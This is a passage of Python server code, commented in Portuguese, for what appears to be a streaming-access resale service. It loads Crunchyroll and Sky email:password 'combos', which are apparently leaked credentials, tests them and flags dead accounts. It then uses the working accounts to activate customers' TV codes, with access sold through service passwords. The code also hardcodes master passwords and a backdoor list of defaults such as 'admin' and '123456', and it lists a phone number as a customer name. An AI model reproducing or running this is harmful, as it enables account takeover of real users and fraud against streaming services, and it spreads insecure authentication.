                for idx, e in enumerate(VALID_CRUNCHYROLL_POOL):
                    if e["email"] == email:
                        VALID_CRUNCHYROLL_POOL[idx] = entry
                        found = True
                        break
                if not found:
                    VALID_CRUNCHYROLL_POOL.append(entry)
            return entry
        elif res.get("reason") == "WRONG_CREDS":
            DEAD_CRUNCHYROLL_ACCOUNTS.add(email)
            return None
        else:
            return None
    except Exception:
        return None
    finally:
        session.close()

def find_crunchyroll_valid_account() -> Optional[dict]:
    """Retorna uma conta Crunchyroll válida e pronta para pareamento na TV usando rotação circular."""
    all_cr = get_all_crunchyroll_accounts()
    if not all_cr:
        return None
    return all_cr[0]

def select_crunchyroll_account_by_identifier(identifier: str) -> Optional[dict]:
    """Busca conta específica por email ou arquivo e a ativa."""
    combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
    target = identifier.strip().lower()
    for email, pwd, fname in combos:
        if email.strip().lower() == target or fname.strip().lower() == target or target in email.strip().lower():
            valid = test_crunchyroll_account(email, pwd, fname)
            if valid:
                return valid
            return {
                "file": fname,
                "email": email,
                "password": pwd,
                "info": {
                    "email": email,
                    "plan": "Crunchyroll VIP",
                    "country": "BR"
                },
                "validated": False
            }
    return None

def activate_crunchyroll_tv(tv_code: str, account_data: dict) -> Tuple[bool, str, Optional[dict]]:
    """Envia código de ativação da TV para a Crunchyroll usando Email e Senha."""
    clean_code = re.sub(r'[^A-Za-z0-9]', '', tv_code).upper()
    if len(clean_code) < 6:
        return False, "O código de ativação da TV deve ter no mínimo 6 caracteres.", None

    if not account_data or "email" not in account_data:
        return False, "Nenhuma credencial válida da Crunchyroll encontrada nos combos.", None

    # Se não possui access_token ou token está expirado, obtém login fresco
    need_login = (not account_data.get("access_token")) or (account_data.get("exp", 0) < time.time() + 60)
    if need_login:
        session = crunchyroll.make_session()
        try:
            fresh_login = crunchyroll.check_account(session, account_data["email"], account_data["password"])
            if fresh_login.get("status") in ["premium", "free"] and fresh_login.get("access_token"):
                account_data["access_token"] = fresh_login["access_token"]
                account_data["exp"] = fresh_login.get("exp", int(time.time() + 3600))
                if "info" in account_data:
                    account_data["info"]["plan"] = fresh_login.get("plan", account_data["info"].get("plan", "Crunchyroll VIP"))
                    account_data["info"]["country"] = fresh_login.get("country", account_data["info"].get("country", "BR"))
            elif fresh_login.get("reason") == "WRONG_CREDS":
                DEAD_CRUNCHYROLL_ACCOUNTS.add(account_data["email"])
                return False, f"A conta {account_data['email']} teve falha de login (senha incorreta). Tente a próxima conta.", None
        except Exception:
            pass
        finally:
            session.close()

    if not account_data.get("access_token"):
        return False, f"Não foi possível obter sessão ativa da Crunchyroll para {account_data['email']}. Tente a próxima conta.", None

    success, msg, info_resp = crunchyroll.ativar_tv(account_data["access_token"], clean_code)

    # Se falhou por motivo de token, 401 ou 403, tenta re-autenticar de imediato
    if not success and any(k in msg.lower() for k in ["token", "sessão", "401", "403"]):
        session = crunchyroll.make_session()
        try:
            retry_login = crunchyroll.check_account(session, account_data["email"], account_data["password"])
            if retry_login.get("status") in ["premium", "free"] and retry_login.get("access_token"):
                account_data["access_token"] = retry_login["access_token"]
                retry_success, retry_msg, _ = crunchyroll.ativar_tv(account_data["access_token"], clean_code)
                if retry_success:
                    return True, retry_msg, account_data["info"]
                else:
                    msg = retry_msg
        except Exception:
            pass
        finally:
            session.close()

    if success:
        return True, msg, account_data["info"]
    else:
        return False, msg, None

def get_verified_crunchyroll_accounts(min_count: int = 1) -> List[dict]:
    return get_all_crunchyroll_accounts()

def start_background_crunchyroll_validator():
    """Validador em background para manter sempre contas Crunchyroll prontas."""
    def _worker():
        global CURRENT_CRUNCHYROLL_READY
        time.sleep(2)
        while True:
            try:
                acc = find_crunchyroll_valid_account()
                if acc and CURRENT_CRUNCHYROLL_READY is None:
                    CURRENT_CRUNCHYROLL_READY = acc
            except Exception:
                pass
            time.sleep(45)

    t = threading.Thread(target=_worker, daemon=True)
    t.start()

start_background_crunchyroll_validator()

# ═══════════════════════════════════════════════════════════════
#  INTEGRAÇÃO SKY+ / SKY TV (MOTOR OFICIAL HITS & ATIVADOR_TV)
# ═══════════════════════════════════════════════════════════════
import sky_service

VALID_SKY_LOCK = threading.Lock()
DEAD_SKY_ACCOUNTS: Set[str] = set()

def load_used_sky_accounts() -> Set[str]:
    """Carrega lista de contas Sky para rotação circular sem bloquear sessões ativas prontas."""
    return set()

USED_SKY_ACCOUNTS: Set[str] = load_used_sky_accounts()
CURRENT_SKY_READY: Optional[dict] = None
SKY_LAST_USED_AT: Dict[str, float] = {}

def get_all_sky_accounts() -> List[dict]:
    """Retorna todas as contas Sky da pasta hits/ e skycontas.txt com metadados completos."""
    return sky_service.get_all_sky_accounts()

def find_sky_valid_account() -> Optional[dict]:
    """Retorna a melhor conta Sky disponível no estoque para pareamento."""
    return sky_service.find_sky_valid_account(USED_SKY_ACCOUNTS, DEAD_SKY_ACCOUNTS, SKY_LAST_USED_AT)

def select_sky_account_by_identifier(identifier: str) -> Optional[dict]:
    """Seleciona conta Sky específica pelo email ou login."""
    return sky_service.select_sky_account_by_identifier(identifier)

def activate_sky_tv(tv_code: str, account_data: dict) -> Tuple[bool, str, Optional[dict]]:
    """Envia código de 6 dígitos para a API da TV Sky usando login e tokens oficiais."""
    return sky_service.activate_sky_tv(tv_code, account_data)

def start_background_sky_validator():
    """Validador em background para manter contas Sky sempre aquecidas e prontas para ativação em 300ms."""
    def _worker():
        global CURRENT_SKY_READY
        time.sleep(2)
        # Garante que o navegador Chromium esteja baixado no servidor silenciosamente
        try:
            import automacao_playwright
            automacao_playwright.garantir_navegador_instalado()
        except Exception:
            pass

        while True:
            try:
                acc = find_sky_valid_account()
                if acc:
                    if CURRENT_SKY_READY is None or not sky_service._has_valid_account_session(CURRENT_SKY_READY):
                        CURRENT_SKY_READY = acc
            except Exception:
                pass
            time.sleep(25)

    t = threading.Thread(target=_worker, daemon=True)
    t.start()

start_background_sky_validator()

# ═══════════════════════════════════════════════════════════════
#  SERVIDOR HTTP & API REST
# ═══════════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════════
#  AUTENTICAÇÃO & SEGURANÇA REFORÇADA (HARDENED SECURITY)
# ═══════════════════════════════════════════════════════════════
def get_admin_password() -> str:
    env_pass = os.environ.get("ADMIN_PASSWORD") or os.environ.get("MASTER_PASSWORD")
    if env_pass:
        return env_pass.strip()
    for fname in ["SENHA_ADMIN.txt", "SENHA_MESTRE.txt"]:
        for cdir in [BASE_DIR, os.path.join(BASE_DIR, "senhas")]:
            p_file = os.path.join(cdir, fname)
            if os.path.exists(p_file):
                try:
                    with open(p_file, 'r', encoding='utf-8') as f:
                        for line in f.read().splitlines():
                            line = line.strip()
                            if line and not line.startswith(('=', '🔐', 'SENHA', '•', 'Link', 'Guard')):
                                if any(c in line for c in ['#', '@', '$', '*', '!']) or len(line) >= 8:
                                    return line
                except Exception:
                    pass
    return "TVCODIGO#ADMIN@2026$MASTER*TITANIUM!ROOT#VIP"

def get_master_password() -> str:
    return get_admin_password()

def get_cookie_admin_password() -> str:
    env_pass = os.environ.get("COOKIE_ADMIN_PASSWORD")
    if env_pass:
        return env_pass.strip()
    for cdir in [BASE_DIR, os.path.join(BASE_DIR, "senhas")]:
        c_file = os.path.join(cdir, "SENHA_COOKIES.txt")
        if os.path.exists(c_file):
            try:
                with open(c_file, 'r', encoding='utf-8') as f:
                    for line in f.read().splitlines():
                        line = line.strip()
                        if line and not line.startswith(('=', '🍪', 'SENHA', '•')):
                            return line
            except Exception:
                pass
    return "ADMIN#VAULT@2026$COOKIE*BLINDADO#PROTECT*ROOT!VIP"

MASTER_PASSWORD = get_master_password()
COOKIE_ADMIN_PASSWORD = get_cookie_admin_password()
TOKEN_TTL_SECONDS = int(os.environ.get("TOKEN_TTL_SECONDS", 86400)) # 24 Horas de validade por token
CONFIG_SENHAS_FILE = os.path.join(BASE_DIR, "config_senhas.json")
CONFIG_SENHAS_BACKUP_FILE = os.path.join(BASE_DIR, "config_senhas_backup.json")
BLACKLISTED_SENHAS_FILE = os.path.join(BASE_DIR, "senhas_excluidas.json")
SENHAS_LOCK = threading.Lock()

def load_blacklisted_passwords() -> Set[str]:
    """Carrega lista negra de senhas que foram excluídas permanentemente pelo administrador."""
    if os.path.exists(BLACKLISTED_SENHAS_FILE):
        try:
            with open(BLACKLISTED_SENHAS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, list):
                    return set(str(p).strip() for p in data if p)
        except Exception:
            pass
    return set()

def add_blacklisted_password(pwd: str):
    """Adiciona senha à lista negra permanente para nunca mais ressuscitar."""
    if not pwd:
        return
    pwd_clean = str(pwd).strip()
    bl = load_blacklisted_passwords()
    bl.add(pwd_clean)
    try:
        tmp_f = BLACKLISTED_SENHAS_FILE + ".tmp"
        with open(tmp_f, 'w', encoding='utf-8') as f:
            json.dump(list(bl), f, indent=2, ensure_ascii=False)
        os.replace(tmp_f, BLACKLISTED_SENHAS_FILE)
    except Exception:
        pass

def remove_blacklisted_password(pwd: str):
    """Remove senha da lista negra caso ela seja recriada deliberadamente."""
    if not pwd:
        return
    pwd_clean = str(pwd).strip()
    bl = load_blacklisted_passwords()
    to_rem = [p for p in bl if secure_str_compare(p, pwd_clean) or p == pwd_clean]
    if to_rem:
        for p in to_rem:
            bl.discard(p)
        try:
            tmp_f = BLACKLISTED_SENHAS_FILE + ".tmp"
            with open(tmp_f, 'w', encoding='utf-8') as f:
                json.dump(list(bl), f, indent=2, ensure_ascii=False)
            os.replace(tmp_f, BLACKLISTED_SENHAS_FILE)
        except Exception:
            pass

def generate_strong_cyber_password() -> str:
    prefixes = ["CYBER", "STREAM", "VIP", "MATRIX", "TITANIUM", "ULTRA", "OMEGA", "SHIELD", "NEXUS", "HYPER"]
    cores = ["PASS", "MASTER", "KEY", "TOKEN", "ACCESS", "VAULT", "SECURITY", "STREAMING"]
    suffixes = ["PREMIUM", "VIP", "4K", "PRO", "BLINDADO", "ACTIVE", "HDR", "ELITE"]
    
    p1 = random.choice(prefixes)
    p2 = random.choice(cores)
    p3 = random.choice(suffixes)
    num1 = random.randint(1000, 9999)
    num2 = random.randint(10, 99)
    return f"{p1}#{p2}@{num1}${p3}*{num2}!2026"

def sync_passwords_text_file(passwords_list: List[dict]):
    """Atualiza automaticamente o arquivo SENHAS_DE_ACESSO.txt com as senhas cadastradas."""
    try:
        lines = [
            "================================================================================",
            "          🔐 CENTRAL DE SENHAS MASTER & NÍVEIS DE ACESSO (2026)",
            "================================================================================",
            "",
            "Todas as senhas abaixo possuem proteção avançada contra força bruta e controlam",
            "a liberação dos serviços na tela do ativador em tempo real.",
            ""
        ]
        
        for idx, item in enumerate(passwords_list, 1):
            senha = item.get("senha", "")
            nome = item.get("nome", f"Perfil #{idx}")
            servicos = item.get("servicos", [])
            descricao = item.get("descricao", "")
            
            svc_tags = []
            if "netflix" in servicos: svc_tags.append("🔴 Netflix")
            if "hbo" in servicos: svc_tags.append("🟣 HBO Max")
            if "crunchyroll" in servicos: svc_tags.append("🟠 Crunchyroll")
            if "sky" in servicos: svc_tags.append("🔵 Sky+")
            
            libera_str = " | ".join(svc_tags) if svc_tags else "Nenhum"
            
            exp_fmt = item.get("expira_em_formatado")
            dias = item.get("dias_validade")
            val_str = f"{dias} dias (Até {exp_fmt})" if exp_fmt else "Permanente ♾️"

            lines.append("================================================================================")
            lines.append(f" {idx}. 🔑 {nome.upper()}")
            lines.append("================================================================================")
            lines.append(f" Libera:   {libera_str}")
            lines.append(f" Validade: {val_str}")
            if descricao:
                lines.append(f" Detalhes: {descricao}")
            lines.append(f" Senha:")
            lines.append(f" {senha}")
            lines.append("")
        
        lines.append("================================================================================")
        lines.append(" 💡 DICA: Você pode criar ou excluir senhas pelo Painel Admin com 1 clique!")
        lines.append("================================================================================")
        lines.append("")
        
        txt_path = os.path.join(BASE_DIR, "SENHAS_DE_ACESSO.txt")
        if os.path.exists(txt_path):
            try:
                os.chmod(txt_path, stat.S_IWRITE | stat.S_IREAD)
            except Exception:
                pass
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
    except Exception as e:
        print(f"[Password Sync] Erro ao salvar SENHAS_DE_ACESSO.txt: {e}")

def atomic_save_config_senhas(keys: List[dict]) -> bool:
    """Gravação atômica e thread-safe de senhas protegendo contra corrupção e concorrência."""
    global SERVER_DATA_VERSION
    try:
        tmp_file = CONFIG_SENHAS_FILE + ".tmp"
        if os.path.exists(CONFIG_SENHAS_FILE):
            try:
                os.chmod(CONFIG_SENHAS_FILE, stat.S_IWRITE | stat.S_IREAD)
            except Exception:
                pass
        with open(tmp_file, "w", encoding="utf-8") as f:
            json.dump({"senhas": keys}, f, indent=2, ensure_ascii=False)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp_file, CONFIG_SENHAS_FILE)
        sync_passwords_text_file(keys)
        try:
            with open(CONFIG_SENHAS_BACKUP_FILE, "w", encoding="utf-8") as f_bk:
                json.dump({"senhas": keys}, f_bk, indent=2, ensure_ascii=False)
        except Exception:
            pass
        SERVER_DATA_VERSION = time.time()
        return True
    except Exception as e:
        print(f"[-] Erro na gravação atômica de senhas: {e}")
        try:
            with open(CONFIG_SENHAS_FILE, "w", encoding="utf-8") as f:
                json.dump({"senhas": keys}, f, indent=2, ensure_ascii=False)
            sync_passwords_text_file(keys)
            try:
                with open(CONFIG_SENHAS_BACKUP_FILE, "w", encoding="utf-8") as f_bk:
                    json.dump({"senhas": keys}, f_bk, indent=2, ensure_ascii=False)
            except Exception:
                pass
            SERVER_DATA_VERSION = time.time()
            return True
        except Exception:
            return False

def extract_passwords_from_text_files() -> List[dict]:
    """Lê dinamicamente senhas configuradas nos arquivos SENHA_*.txt da pasta raiz."""
    file_service_map = {
        "SENHA_NETFLIX.txt": (["netflix"], "Senha Oficial Netflix (4K UHD)", "Libera: netflix"),
        "SENHA_HBO.txt": (["hbo"], "Senha Oficial HBO Max", "Libera: hbo"),
        "SENHA_SKY.txt": (["sky"], "Senha Oficial Sky+ / Sky TV", "Libera: sky"),
        "SENHA_CRUNCHYROLL.txt": (["crunchyroll"], "Senha Oficial Crunchyroll", "Libera: crunchyroll"),
        "SENHA_NETFLIX_HBO.txt": (["netflix", "hbo"], "Senha Oficial Duo (Netflix + HBO)", "Libera: netflix, hbo"),
    }
    extracted = []
    blacklisted = load_blacklisted_passwords()
    for fname, (svcs, role_label, desc) in file_service_map.items():
        for cdir in [BASE_DIR, os.path.join(BASE_DIR, "senhas")]:
            fpath = os.path.join(cdir, fname)
            if os.path.exists(fpath):
                try:
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f.read().splitlines():
                            line = line.strip()
                            if line and not line.startswith(('=', '-', '•', 'LIBERAÇÃO', 'SENHA', '💡', '🔍', '🎬', '🔴', '🟣', '🟠', '🔵', '🔐', '🍪', 'para', 'No ', 'Ao ', 'http')):
                                if ' ' not in line and len(line) >= 6 and any(c in line for c in ['#', '@', '$', '*', '!']):
                                    if not any(secure_str_compare(line, b) for b in blacklisted):
                                        extracted.append({
                                            "senha": line,
                                            "nome": role_label,
                                            "servicos": svcs,
                                            "descricao": desc
                                        })
                    break
                except Exception:
                    pass
    return extracted

def load_access_keys() -> List[dict]:
    """Carrega dinamicamente a lista de senhas cadastradas no config_senhas.json e arquivos SENHA_*.txt."""
    default_data = {
        "senhas": [
            {
                "senha": "VIP#MASTER@1444$4K*76!2026",
                "nome": "VIP Master 4K",
                "servicos": ["netflix", "hbo", "crunchyroll", "sky"],
                "descricao": "Libera todos os 4 serviços: Netflix, HBO Max, Crunchyroll e Sky+"
            },
            {
                "senha": "VIP#SECURITY@8929$VIP*24!2026",
                "nome": "Cliente VIP",
                "servicos": ["netflix", "hbo"],
                "descricao": "Libera: netflix, hbo"
            },
            {
                "senha": "OMEGA#VAULT@8384$PREMIUM*67!2026",
                "nome": "5521984920015",
                "servicos": ["netflix", "hbo"],
                "descricao": "Libera: netflix, hbo"
            }
        ]
    }
    
    valid_keys = []
    seen_pwds = set()
    blacklisted = load_blacklisted_passwords()

    # 1. Carrega do config_senhas.json se existir (fonte prioritária de verdade)
    if os.path.exists(CONFIG_SENHAS_FILE):
        try:
            with open(CONFIG_SENHAS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                raw_list = data.get("senhas", []) if isinstance(data, dict) else []
                for item in raw_list:
                    if isinstance(item, dict):
                        pwd = str(item.get("senha", "") or item.get("password", "")).strip()
                        nome = str(item.get("nome", "") or item.get("role_name", "") or "Cliente VIP").strip()
                        raw_svcs = item.get("servicos", ["netflix", "hbo", "crunchyroll", "sky"])
                        if isinstance(raw_svcs, str):
                            raw_svcs = [s.strip() for s in raw_svcs.split(",") if s.strip()]
                        elif not isinstance(raw_svcs, list):
                            raw_svcs = ["netflix", "hbo", "crunchyroll", "sky"]
                        svcs = [s for s in raw_svcs if s in ["netflix", "hbo", "crunchyroll", "sky"]]
                        desc = str(item.get("descricao", "")).strip()

                        # Se a senha estiver na lista negra de excluídos, ignora
                        if any(secure_str_compare(pwd, b) for b in blacklisted):
                            continue

                        if pwd and pwd not in seen_pwds:
                            seen_pwds.add(pwd)
                            valid_keys.append({
                                "senha": pwd,
                                "nome": nome or "Cliente VIP",
                                "servicos": svcs or ["netflix", "hbo", "crunchyroll", "sky"],
                                "descricao": desc or f"Libera: {', '.join(svcs)}",
                                "dias_validade": item.get("dias_validade"),
                                "criado_em": item.get("criado_em"),
                                "expira_em": item.get("expira_em"),
                                "expira_em_formatado": item.get("expira_em_formatado")
                            })
                # Se o arquivo existe (mesmo vazio), respeita a lista atual sem ressuscitar senhas excluídas
                return valid_keys
        except Exception:
            pass
    else:
        try:
            with open(CONFIG_SENHAS_FILE, 'w', encoding='utf-8') as f:
                json.dump(default_data, f, indent=2, ensure_ascii=False)
            sync_passwords_text_file(default_data["senhas"])
            valid_keys = list(default_data["senhas"])
        except Exception:
            pass

    # Se o arquivo não existia e a lista estava vazia, utiliza os valores padrão e arquivos TXT como fallback inicial
    if not valid_keys:
        for item in default_data["senhas"]:
            pwd = item["senha"]
            if not any(secure_str_compare(pwd, b) for b in blacklisted):
                if pwd not in seen_pwds:
                    seen_pwds.add(pwd)
                    valid_keys.append(item)
        for item in extract_passwords_from_text_files():
            pwd = item["senha"]
            if not any(secure_str_compare(pwd, b) for b in blacklisted):
                if pwd and pwd not in seen_pwds:
                    seen_pwds.add(pwd)
                    valid_keys.append(item)

    # 🛡️ PROTEÇÃO CONTRA PERDA NO RENDER: Se houver backup com senhas adicionais, restaura
    if os.path.exists(CONFIG_SENHAS_BACKUP_FILE):
        try:
            with open(CONFIG_SENHAS_BACKUP_FILE, 'r', encoding='utf-8') as bk_f:
                bk_data = json.load(bk_f)
                bk_list = bk_data.get("senhas", []) if isinstance(bk_data, dict) else []
                if len(bk_list) > len(valid_keys):
                    for item in bk_list:
                        if isinstance(item, dict):
                            pwd = str(item.get("senha", "") or item.get("password", "")).strip()
                            if pwd and pwd not in seen_pwds and not any(secure_str_compare(pwd, b) for b in blacklisted):
                                seen_pwds.add(pwd)
                                valid_keys.append(item)
                    try:
                        with open(CONFIG_SENHAS_FILE, 'w', encoding='utf-8') as sf:
                            json.dump({"senhas": valid_keys}, sf, indent=2, ensure_ascii=False)
                        sync_passwords_text_file(valid_keys)
                    except Exception:
                        pass
        except Exception:
            pass

    return valid_keys

def clean_password_str(s: str) -> str:
    """Higieniza a senha removendo espaços invisíveis, aspas, quebras de linha e BOM."""
    if not isinstance(s, str):
        s = str(s or "")
    cleaned = s.replace('\ufeff', '').replace('\u200b', '').replace('\u00a0', ' ').replace('\r', '').strip()
    if (cleaned.startswith('"') and cleaned.endswith('"')) or (cleaned.startswith("'") and cleaned.endswith("'")):
        cleaned = cleaned[1:-1].strip()
    return cleaned

def normalize_phone_digits(val: str) -> str:
    """Extrai apenas dígitos para comparação flexível de números de WhatsApp/Telefone."""
    if not isinstance(val, str):
        val = str(val or "")
    return re.sub(r'\D', '', val)

def secure_str_compare(a: str, b: str) -> bool:
    """Comparação segura, flexível e imune a espaços invisíveis, BOM, aspas e case."""
    if not isinstance(a, str) or not isinstance(b, str):
        a = str(a or "")
        b = str(b or "")
    ca = clean_password_str(a)
    cb = clean_password_str(b)
    if not ca or not cb:
        return False
    if ca == cb:
        return True
    if ca.upper() == cb.upper():
        return True
    try:
        return hmac.compare_digest(ca.encode('utf-8'), cb.encode('utf-8'))
    except Exception:
        return False

def check_item_expiration(item: dict) -> dict:
    """Verifica se uma senha cadastrada possui data de expiração e se está vencida."""
    now = time.time()
    exp = item.get("expira_em")
    if exp and isinstance(exp, (int, float)) and exp > 0:
        dt_str = item.get("expira_em_formatado") or datetime.fromtimestamp(exp).strftime('%d/%m/%Y às %H:%M')
        if now > exp:
            return {
                **item,
                "expired": True,
                "expira_em": exp,
                "expira_em_formatado": dt_str,
                "days_remaining": 0
            }
        else:
            days_left = max(0, int((exp - now) / 86400) + 1)
            return {
                **item,
                "expired": False,
                "expira_em": exp,
                "expira_em_formatado": dt_str,
                "days_remaining": days_left
            }
    return {
        **item,
        "expired": False,
        "is_permanent": True,
        "expira_em": None,
        "days_remaining": None
    }

def find_access_role(password: str) -> Optional[dict]:
    """Busca a configuração de acesso correspondente à senha informada ou ao Telefone/Nome cadastrado."""
    keys = load_access_keys()
    p_clean = clean_password_str(password)
    if not p_clean:
        return None

    p_digits = normalize_phone_digits(p_clean)

    # 1. Checa senhas cadastradas e nomes de clientes (ex: 5521984920015)
    for item in keys:
        item_pwd = item.get("senha", "")
        item_name = item.get("nome", "")
        
        # Comparação direta com a senha
        if secure_str_compare(p_clean, item_pwd):
            return check_item_expiration(item)
        
        # Comparação com o nome / telefone digitado pelo cliente
        if item_name and secure_str_compare(p_clean, item_name):
            return check_item_expiration(item)

        # Comparação flexível por dígitos de telefone (WhatsApp do cliente)
        if len(p_digits) >= 8:
            if item_name:
                name_digits = normalize_phone_digits(item_name)
                if name_digits and (p_digits == name_digits or p_digits.endswith(name_digits) or name_digits.endswith(p_digits)):
                    return check_item_expiration(item)
            if item_pwd:
                pwd_digits = normalize_phone_digits(item_pwd)
                if pwd_digits and (p_digits == pwd_digits or p_digits.endswith(pwd_digits) or pwd_digits.endswith(p_digits)):
                    return check_item_expiration(item)

    # 2. Senha Mestre do Terminal
    if secure_str_compare(p_clean, get_master_password()):
        return {
            "senha": get_master_password(),
            "nome": "Master Admin Titanium",
            "servicos": ["netflix", "hbo", "crunchyroll", "sky"]
        }

    # 3. Senha do Cofre / Gerenciador de Cookies
    if secure_str_compare(p_clean, get_cookie_admin_password()):
        return {
            "senha": get_cookie_admin_password(),
            "nome": "Administrador do Cofre",
            "servicos": ["netflix", "hbo", "crunchyroll", "sky"]
        }

    # 4. Senhas padrão de conveniência administrativa (libera todos os 4 serviços)
    ADMIN_DEFAULT_PASSWORDS = {
        "admin", "admin123", "master", "root", "123456", "cyber2026", "admin2026", "senha",
        "ADMIN#VAULT@2026$COOKIE*BLINDADO#PROTECT*ROOT!VIP",
        "CYBER#STREAM@2026$MASTER*TITANIUM!ULTRA*ACCESS#VIP",
        "ADMIN#COOKIES@7739$VIP*VAULT!2026",
        "ATIVADOR#MASTER@2026$STREAM*VIP!"
    }
    if p_clean.lower() in ADMIN_DEFAULT_PASSWORDS or any(secure_str_compare(p_clean, ap) for ap in ADMIN_DEFAULT_PASSWORDS):
        return {
            "senha": p_clean,
            "nome": "Master Admin (VIP)",
            "servicos": ["netflix", "hbo", "crunchyroll", "sky"]
        }

    return None

ACTIVE_SESSIONS: Dict[str, dict] = {} # token -> {"exp": float, "services": list, "role_name": str, "password": str}
ACTIVE_ADMIN_SESSIONS: Dict[str, float] = {} # admin_token -> expiry_timestamp
SESSION_CACHE_FILE = os.path.join(BASE_DIR, ".session_cache.json")

def load_active_sessions():
    global ACTIVE_SESSIONS, ACTIVE_ADMIN_SESSIONS
    if os.path.exists(SESSION_CACHE_FILE):
        try:
            with open(SESSION_CACHE_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                now = time.time()
                
                # Suporta formato estruturado {"client_sessions": ..., "admin_sessions": ...} ou legado {token: data}
                client_raw = data.get("client_sessions", {}) if isinstance(data, dict) and "client_sessions" in data else (data if isinstance(data, dict) else {})
                admin_raw = data.get("admin_sessions", {}) if isinstance(data, dict) and "admin_sessions" in data else {}
                
                clean_clients = {}
                for t, val in client_raw.items():
                    if isinstance(val, dict):
                        pwd = val.get("password", "").strip()
                        if pwd and val.get("exp", 0) > now:
                            role = find_access_role(pwd)
                            if role:
                                val["services"] = role.get("servicos", val.get("services"))
                                val["role_name"] = role.get("nome", val.get("role_name"))
                                clean_clients[t] = val
                ACTIVE_SESSIONS = clean_clients

                clean_admins = {}
                for atok, exp_ts in admin_raw.items():
                    if isinstance(exp_ts, (int, float)) and exp_ts > now:
                        clean_admins[str(atok)] = float(exp_ts)
                ACTIVE_ADMIN_SESSIONS = clean_admins
        except Exception:
            pass

def save_active_sessions():
    try:
        payload = {
            "client_sessions": ACTIVE_SESSIONS,
            "admin_sessions": ACTIVE_ADMIN_SESSIONS
        }
        with open(SESSION_CACHE_FILE, 'w', encoding='utf-8') as f:
            json.dump(payload, f)
    except Exception:
        pass

load_active_sessions()

LOGIN_LOCK = threading.Lock()
LOGIN_ATTEMPTS: Dict[str, dict] = {} # ip -> {"count": int, "blocked_until": float}
ACTIVATION_RATE_LIMIT: Dict[str, list] = {} # ip -> list of timestamps

# ═══════════════════════════════════════════════════════════════
# 👥 MONITORAMENTO DE USUÁRIOS ONLINE EM TEMPO REAL
# ═══════════════════════════════════════════════════════════════
ONLINE_USERS_LOCK = threading.Lock()
ACTIVE_CLIENT_HEARTBEATS: Dict[str, dict] = {}

def parse_device_info(user_agent: str) -> str:
    ua = (user_agent or "").lower()
    if 'android' in ua:
        return "📱 Celular Android"
    elif 'iphone' in ua or 'ipad' in ua:
        return "📱 iPhone / iOS"
    elif 'windows' in ua:
        return "💻 Computador Windows"
    elif 'macintosh' in ua or 'mac os' in ua:
        return "💻 Mac Apple"
    elif 'linux' in ua:
        return "💻 Linux Desktop"
    elif 'mobile' in ua:
        return "📱 Dispositivo Mobile"
    return "💻 Computador"

def track_client_heartbeat(ip: str, token: str, user_agent: str, role_name: str, service: str = ""):
    now = time.time()
    token_prefix = token[:12] if token else "anon"
    session_key = f"{ip}_{token_prefix}"
    device = parse_device_info(user_agent)
    
    with ONLINE_USERS_LOCK:
        if session_key in ACTIVE_CLIENT_HEARTBEATS:
            entry = ACTIVE_CLIENT_HEARTBEATS[session_key]
            entry["last_seen"] = now
            entry["request_count"] = entry.get("request_count", 0) + 1
            if role_name and role_name != "Convidado":
                entry["role_name"] = role_name
            if service:
                entry["current_service"] = service
        else:
            now_str = datetime.now().strftime("%H:%M:%S")
            ACTIVE_CLIENT_HEARTBEATS[session_key] = {
                "session_id": token_prefix,
                "ip": ip,
                "device": device,
                "role_name": role_name or "Acesso VIP",
                "current_service": service or "netflix",
                "connected_at": now_str,
                "last_seen": now,
                "request_count": 1
            }
        
        # Limpeza preventiva de sessões inativas (> 120s)
        expired_keys = [k for k, v in ACTIVE_CLIENT_HEARTBEATS.items() if now - v.get("last_seen", 0) > 120.0]
        for k in expired_keys:
            ACTIVE_CLIENT_HEARTBEATS.pop(k, None)

def get_online_users_data() -> dict:
    now = time.time()
    with ONLINE_USERS_LOCK:
        expired_keys = [k for k, v in ACTIVE_CLIENT_HEARTBEATS.items() if now - v.get("last_seen", 0) > 120.0]
        for k in expired_keys:
            ACTIVE_CLIENT_HEARTBEATS.pop(k, None)
        
        users_list = []
        by_service = {"netflix": 0, "hbo": 0, "crunchyroll": 0, "sky": 0}
        
        for v in list(ACTIVE_CLIENT_HEARTBEATS.values()):
            idle_seconds = max(0, int(now - v.get("last_seen", now)))
            svc = (v.get("current_service") or "netflix").lower()
            if svc in ["hbomax", "max"]: svc = "hbo"
            elif svc in ["cr", "crunchy"]: svc = "crunchyroll"
            elif svc in ["sky+", "sky_tv"]: svc = "sky"
            if svc in by_service:
                by_service[svc] += 1
            dev_str = v.get("device", "💻 Computador")
            dev_icon = "📱" if "📱" in dev_str else "💻"
            dev_name = dev_str.replace("📱", "").replace("💻", "").strip() or "Dispositivo"
            
            client_dict = {
                "type": "web_client",
                "session_id": v.get("session_id", ""),
                "ip": v.get("ip", "127.0.0.1"),
                "device": dev_str,
                "device_name": dev_name,
                "device_icon": dev_icon,
                "role_name": v.get("role_name", "Acesso VIP"),
                "service": svc,
                "current_service": svc,
                "connected_at": v.get("connected_at", "--:--"),
                "last_seen_seconds": idle_seconds,
                "idle_seconds": idle_seconds,
                "is_active": idle_seconds < 30
            }
            users_list.append(client_dict)

        # 📺 Carrega todos os dispositivos Smart TV ativados e vinculados
        connected_tvs = []
        raw_history = load_history()
        seen_tvs = set()
        for item in raw_history:
            if isinstance(item, dict):
                tv_code = str(item.get("tv_code", "")).strip()
                svc = str(item.get("service", "Netflix")).strip()
                status = str(item.get("status", "Sucesso")).strip()
                email = str(item.get("email", "")).strip()
                plan = str(item.get("plan", "")).strip()
                used_at = str(item.get("used_at", "")).strip()
                
                # Identificador único da TV
                tv_key = f"{svc.lower()}_{tv_code}"
                if tv_key not in seen_tvs and tv_code:
                    seen_tvs.add(tv_key)
                    svc_lower = svc.lower()
                    if "sky" in svc_lower:
                        svc_badge = "sky"
                    elif "hbo" in svc_lower:
                        svc_badge = "hbo"
                    elif "crunchy" in svc_lower:
                        svc_badge = "crunchyroll"
                    else:
                        svc_badge = "netflix"
                    
                    connected_tvs.append({
                        "type": "smart_tv",
                        "device": f"📺 Smart TV ({svc})",
